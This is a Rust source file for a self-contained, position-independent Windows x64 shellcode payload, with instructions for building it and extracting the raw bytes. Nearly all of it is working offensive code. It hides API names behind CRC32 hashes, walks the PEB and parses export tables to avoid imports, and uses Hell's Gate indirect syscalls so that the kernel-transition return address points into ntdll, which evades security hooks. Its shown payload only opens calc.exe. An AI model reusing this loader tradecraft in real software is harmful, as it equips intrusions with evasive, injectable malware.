//! Rust PIC (Position-Independent Code) payload.
//!
//! Fully self-contained — no external crate dependencies.
//!
//! Two build modes:
//!   Normal:  cargo build --release           (std, println! diagnostics)
//!   PIC:     cargo build --release --features pic  (no_std, custom entry, single section)
//!
//! Extract:
//!   python tools/validate_pic.py target/release/pic_example.exe -o payload.bin

#![cfg_attr(feature = "pic", no_std)]
#![cfg_attr(feature = "pic", no_main)]

use core::ffi::c_void;
use core::ptr::null_mut;

// ── Panic handler (PIC / no_std mode) ──────────────────────────────────────
#[cfg(feature = "pic")]
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    unsafe { core::arch::asm!("ud2", options(noreturn, nostack)) }
}

// ── Context struct: all mutable state in one heap allocation ────────────────
//
// In PIC code you cannot use static mut variables -- they live in .text after
// section merging. Writing to them faults. All mutable state goes on the heap.
#[repr(C, align(64))]
struct PicCtx {
    heap_handle: usize,
    fn_heap_alloc: usize,
    fn_heap_free: usize,
    alloc_base: *mut c_void,
    alloc_size: usize,
}

// ── Indirect syscall trampoline ─────────────────────────────────────────────
//
// Calling convention (Windows x64):
//   rcx = ssn, rdx = syscall_addr, r8 = argc (ignored),
//   r9 = arg0, [rsp+0x28..0x48] = arg1..arg5
// Returns NTSTATUS in rax.
//
// The trampoline shuffles the args into NT calling convention and JMPs to the
// syscall;ret gadget inside ntdll. The ret there pops our return address, so
// the visible return address during kernel transition is inside ntdll — not
// inside our payload.
core::arch::global_asm!(
    ".globl pic_do_syscall",
    "pic_do_syscall:",
    "mov     [rsp+8], ecx",     // save SSN in caller's shadow space
    "mov     r11, rdx",          // r11 = gadget address (volatile, no save needed)
    "mov     r10, r9",           // r10 = arg0 (NT first-arg register)
    "mov     rdx, [rsp+0x28]",   // rdx = arg1
    "mov     r8,  [rsp+0x30]",   // r8  = arg2
    "mov     r9,  [rsp+0x38]",   // r9  = arg3
    "mov     rax, [rsp+0x40]",   // shift arg4 into NT position
    "mov     [rsp+0x28], rax",
    "mov     rax, [rsp+0x48]",   // shift arg5 into NT position
    "mov     [rsp+0x30], rax",
    "mov     eax, [rsp+8]",      // eax = SSN (restored from shadow)
    "jmp     r11",               // indirect syscall via gadget in ntdll
);

extern "system" {
    fn pic_do_syscall(
        ssn: u32,
        syscall_addr: usize,
        argc: u32,
        arg0: usize,
        arg1: usize,
        arg2: usize,
        arg3: usize,
        arg4: usize,
        arg5: usize,
    ) -> usize;
}

// ── CRC32B (IEEE polynomial) ────────────────────────────────────────────────
//
// Used for hash-based module lookup (TECHNIQUE 7). const fn so the expected
// hash can be derived from the same algorithm at compile time.
const fn pic_crc32_of(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFF_FFFF;
    let mut i = 0;
    while i < data.len() {
        crc ^= data[i] as u32;
        let mut j = 0;
        while j < 8 {
            if crc & 1 != 0 {
                crc = (crc >> 1) ^ 0xEDB8_8320;
            } else {
                crc >>= 1;
            }
            j += 1;
        }
        i += 1;
    }
    !crc
}

fn pic_crc32(s: &str) -> u32 {
    pic_crc32_of(s.as_bytes())
}

// Hash computed by the same function — no magic constant needed
const NTDLL_CRC32: u32 = pic_crc32_of(b"NTDLL.DLL");

// ═══════════════════════════════════════════════════════════════════════════════
// Normal mode: main() harness with println! output for development/testing
// ═══════════════════════════════════════════════════════════════════════════════
#[cfg(not(feature = "pic"))]
fn main() {
    println!("[*] Rust PIC technique demonstration (normal mode)");
    println!("[*] Build with --features pic for true PIC payload\n");
    unsafe { pic_core() };
    println!("\n[*] All techniques demonstrated successfully");
}

// ═══════════════════════════════════════════════════════════════════════════════
// PIC mode: custom entry point — /NODEFAULTLIB strips CRT, /ENTRY points here
// ═══════════════════════════════════════════════════════════════════════════════
#[cfg(feature = "pic")]
#[no_mangle]
pub unsafe extern "system" fn _pic_entry() -> u32 {
    pic_core();
    0
}

// ═══════════════════════════════════════════════════════════════════════════════
// Core PIC logic — shared between normal and PIC modes
// ═══════════════════════════════════════════════════════════════════════════════
unsafe fn pic_core() {
    // ── TECHNIQUE 1: PEB Walking ────────────────────────────────────────
    //
    // On x64 Windows, gs:[0x60] points to the PEB. From here we walk
    // loaded modules and resolve any export without a single API call.

    let peb: usize;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, nomem));

    if peb == 0 {
        return;
    }

    // PEB+0x30 = ProcessHeap on x64
    let process_heap = *((peb + 0x30) as *const usize);
    if process_heap == 0 {
        return;
    }

    // ── TECHNIQUE 2: Dynamic Module Resolution (no LoadLibrary, no IAT) ─
    //
    // Walk PEB → PEB_LDR_DATA → InMemoryOrderModuleList directly.
    // Pure memory reads, no alloc.

    let ntdll = pic_find_module(peb, b"NTDLL.DLL");
    if ntdll.is_null() {
        return;
    }

    // ── TECHNIQUE 3: Export Resolution by Name ──────────────────────────
    //
    // Parse IMAGE_EXPORT_DIRECTORY directly. No GetProcAddress, no alloc.

    type RtlAllocateHeapFn = unsafe extern "system" fn(usize, u32, usize) -> *mut c_void;
    type RtlFreeHeapFn = unsafe extern "system" fn(usize, u32, *mut c_void) -> u32;

    let fn_alloc: RtlAllocateHeapFn = match pic_find_export(ntdll, b"RtlAllocateHeap") {
        p if !p.is_null() => core::mem::transmute(p),
        _ => return,
    };
    let fn_free: RtlFreeHeapFn = match pic_find_export(ntdll, b"RtlFreeHeap") {
        p if !p.is_null() => core::mem::transmute(p),
        _ => return,
    };

    // ── TECHNIQUE 4: Heap-Allocated Context (no globals) ────────────────
    //
    // All mutable state in a single heap struct. No static mut.

    let ctx_size = core::mem::size_of::<PicCtx>();
    let ctx_ptr = fn_alloc(process_heap, 0x08 /* HEAP_ZERO_MEMORY */, ctx_size);
    if ctx_ptr.is_null() {
        return;
    }

    let ctx = &mut *(ctx_ptr as *mut PicCtx);
    ctx.heap_handle = process_heap;
    ctx.fn_heap_alloc = fn_alloc as usize;
    ctx.fn_heap_free = fn_free as usize;

    // ── TECHNIQUE 5: Indirect Syscalls ──────────────────────────────────
    //
    // Hell's Gate: SSN is the u16 at stub+4 in an unhooked ntdll stub.
    // Execute the syscall from the gadget inside ntdll so the return
    // address visible during kernel transition points into ntdll.

    let nt_alloc_ptr = pic_find_export(ntdll, b"NtAllocateVirtualMemory");
    if nt_alloc_ptr.is_null() {
        fn_free(process_heap, 0, ctx_ptr);
        return;
    }

    let ssn = *((nt_alloc_ptr as usize + 4) as *const u16);

    let syscall_addr = match pic_find_syscall_instr(nt_alloc_ptr as *const u8) {
        Some(a) => a,
        None => { fn_free(process_heap, 0, ctx_ptr); return; }
    };

    let mut addr: *mut c_void = null_mut();
    let mut size: usize = 0x1000;

    let status = pic_do_syscall(
        ssn as u32,
        syscall_addr,
        6,
        -1isize as usize,               // ProcessHandle = NtCurrentProcess()
        &mut addr as *mut _ as usize,   // BaseAddress
        0,                              // ZeroBits
        &mut size as *mut _ as usize,   // RegionSize
        0x3000,                         // MEM_COMMIT | MEM_RESERVE
        0x04,                           // PAGE_READWRITE
    );

    if status != 0 {
        fn_free(process_heap, 0, ctx_ptr);
        return;
    }

    ctx.alloc_base = addr;
    ctx.alloc_size = size;

    if !addr.is_null() {
        let marker = b"PIC_OK\0";
        core::ptr::copy_nonoverlapping(marker.as_ptr(), addr as *mut u8, marker.len());
    }

    // ── TECHNIQUE 6: Dynamic WinAPI Resolution ──────────────────────────
    //
    // Resolve WinExec from kernel32 via PEB walk and launch calc.exe as
    // visible proof-of-execution.

    let k32 = pic_find_module(peb, b"KERNEL32.DLL");
    if !k32.is_null() {
        let we_ptr = pic_find_export(k32, b"WinExec");
        if !we_ptr.is_null() {
            type WinExecFn = unsafe extern "system" fn(*const u8, u32) -> u32;
            let win_exec: WinExecFn = core::mem::transmute(we_ptr);
            win_exec(b"calc.exe\0".as_ptr(), 1u32);
        }
    }

    // ── TECHNIQUE 7: Hash-Based Resolution ──────────────────────────────
    //
    // Replace string comparison with CRC32 — no API name strings visible.
    // NTDLL_CRC32 is derived at compile time from the same pic_crc32 used
    // at runtime, so the constant and algorithm are always in sync.

    let _ntdll_by_hash = pic_find_module_by_hash(peb, NTDLL_CRC32, pic_crc32);

    // ── CLEANUP: Free allocations, zero-wipe context ────────────────────

    if !ctx.alloc_base.is_null() {
        let nt_free_ptr = pic_find_export(ntdll, b"NtFreeVirtualMemory");
        if !nt_free_ptr.is_null() {
            let free_ssn = *((nt_free_ptr as usize + 4) as *const u16);
            if let Some(free_syscall) = pic_find_syscall_instr(nt_free_ptr as *const u8) {
                let mut free_addr = ctx.alloc_base;
                let mut free_size: usize = 0;
                pic_do_syscall(
                    free_ssn as u32,
                    free_syscall,
                    4,
                    -1isize as usize,
                    &mut free_addr as *mut _ as usize,
                    &mut free_size as *mut _ as usize,
                    0x8000, // MEM_RELEASE
                    0, 0,   // unused (4-arg syscall)
                );
            }
        }
    }

    core::ptr::write_bytes(ctx_ptr as *mut u8, 0, ctx_size);
    fn_free(process_heap, 0, ctx_ptr);
}

// ── Find `syscall; ret` instruction sequence in an ntdll stub ───────────────
unsafe fn pic_find_syscall_instr(fn_ptr: *const u8) -> Option<usize> {
    for i in 1usize..255 {
        if *fn_ptr.add(i) == 0x0F
            && *fn_ptr.add(i + 1) == 0x05
            && *fn_ptr.add(i + 2) == 0xC3
        {
            return Some(fn_ptr.add(i) as usize);
        }
    }
    None
}

// ── Alloc-free PEB walk: find a module by uppercase ASCII name ──────────────
unsafe fn pic_find_module(peb: usize, target: &[u8]) -> *mut c_void {
    let ldr = *((peb + 0x18) as *const usize);
    let head = (ldr + 0x20) as *const usize;
    let mut current = *(head as *const usize);

    while current != head as usize {
        let entry = current - 0x10;
        let dll_base = *((entry + 0x30) as *const *mut c_void);
        let name_len = *((entry + 0x58) as *const u16) as usize;
        let name_buf = *((entry + 0x60) as *const *const u16);

        if !name_buf.is_null() && name_len > 0 {
            let name_chars = name_len / 2;
            if name_chars == target.len() {
                let mut matched = true;
                for i in 0..name_chars {
                    if (*name_buf.add(i) as u8).to_ascii_uppercase() != target[i] {
                        matched = false;
                        break;
                    }
                }
                if matched {
                    return dll_base;
                }
            }
        }

        current = *(current as *const usize);
    }

    null_mut()
}

// ── Alloc-free PEB walk: find a module by hash ──────────────────────────────
unsafe fn pic_find_module_by_hash(
    peb: usize,
    target_hash: u32,
    hash_fn: fn(&str) -> u32,
) -> *mut c_void {
    let ldr = *((peb + 0x18) as *const usize);
    let head = (ldr + 0x20) as *const usize;
    let mut current = *(head as *const usize);

    while current != head as usize {
        let entry = current - 0x10;
        let dll_base = *((entry + 0x30) as *const *mut c_void);
        let name_len = *((entry + 0x58) as *const u16) as usize;
        let name_buf = *((entry + 0x60) as *const *const u16);

        if !name_buf.is_null() && name_len > 0 {
            let name_chars = (name_len / 2).min(63);
            let mut buf = [0u8; 64];
            for i in 0..name_chars {
                buf[i] = (*name_buf.add(i) as u8).to_ascii_uppercase();
            }
            if let Ok(name_str) = core::str::from_utf8(&buf[..name_chars]) {
                if hash_fn(name_str) == target_hash {
                    return dll_base;
                }
            }
        }

        current = *(current as *const usize);
    }

    null_mut()
}

// ── Alloc-free export resolution: parse IMAGE_EXPORT_DIRECTORY ──────────────
unsafe fn pic_find_export(module_base: *mut c_void, target: &[u8]) -> *mut c_void {
    let base = module_base as usize;
    let nt_off = *((base + 0x3C) as *const u32) as usize;
    // OptionalHeader at nt_off+24; DataDirectory[0] (export) at +112 (PE64)
    let exp_rva = *((base + nt_off + 24 + 112) as *const u32) as usize;
    if exp_rva == 0 {
        return null_mut();
    }

    let exp = base + exp_rva;
    let num_names = *((exp + 24) as *const u32) as usize;
    let rva_funcs = *((exp + 28) as *const u32) as usize;
    let rva_names = *((exp + 32) as *const u32) as usize;
    let rva_ords = *((exp + 36) as *const u32) as usize;

    for i in 0..num_names {
        let name_rva = *((base + rva_names + i * 4) as *const u32) as usize;
        let name_ptr = (base + name_rva) as *const u8;

        let mut matched = true;
        for j in 0..target.len() {
            if *name_ptr.add(j) != target[j] {
                matched = false;
                break;
            }
        }
        if matched && *name_ptr.add(target.len()) == 0 {
            let ordinal = *((base + rva_ords + i * 2) as *const u16) as usize;
            let func_rva = *((base + rva_funcs + ordinal * 4) as *const u32) as usize;
            return (base + func_rva) as *mut c_void;
        }
    }

    null_mut()
}

// ═══════════════════════════════════════════════════════════════════════════════
// Compiler intrinsics (PIC mode only)
// ═══════════════════════════════════════════════════════════════════════════════
//
// With /NODEFAULTLIB, the CRT is gone. LLVM still emits calls to these.

#[cfg(feature = "pic")]
#[allow(non_upper_case_globals)]
#[no_mangle]
pub static _tls_index: u32 = 0;

#[cfg(feature = "pic")]
mod pic_intrinsics {
    #[no_mangle]
    pub unsafe extern "C" fn strlen(s: *const u8) -> usize {
        let mut len = 0;
        while *s.add(len) != 0 {
            len += 1;
        }
        len
    }

    #[no_mangle]
    pub unsafe extern "C" fn __CxxFrameHandler3() -> i32 {
        0
    }

    #[no_mangle]
    pub unsafe extern "C" fn memcpy(dst: *mut u8, src: *const u8, n: usize) -> *mut u8 {
        let mut i = 0;
        while i < n {
            *dst.add(i) = *src.add(i);
            i += 1;
        }
        dst
    }

    #[no_mangle]
    pub unsafe extern "C" fn memset(dst: *mut u8, val: i32, n: usize) -> *mut u8 {
        let mut i = 0;
        while i < n {
            *dst.add(i) = val as u8;
            i += 1;
        }
        dst
    }

    #[no_mangle]
    pub unsafe extern "C" fn memcmp(a: *const u8, b: *const u8, n: usize) -> i32 {
        let mut i = 0;
        while i < n {
            let diff = (*a.add(i) as i32) - (*b.add(i) as i32);
            if diff != 0 {
                return diff;
            }
            i += 1;
        }
        0
    }
}

// ── Stack probe ─────────────────────────────────────────────────────────────
//
// Windows x64: probe each page when a stack frame exceeds 4 KB.
#[cfg(feature = "pic")]
core::arch::global_asm!(
    ".globl __chkstk",
    "__chkstk:",
    "push rcx",
    "push rax",
    "cmp  rax, 0x1000",
    "lea  rcx, [rsp + 24]",
    "jb   4f",
    "3:",
    "sub  rcx, 0x1000",
    "test byte ptr [rcx], 0",
    "sub  rax, 0x1000",
    "cmp  rax, 0x1000",
    "ja   3b",
    "4:",
    "sub  rcx, rax",
    "test byte ptr [rcx], 0",
    "pop  rax",
    "pop  rcx",
    "ret",
);
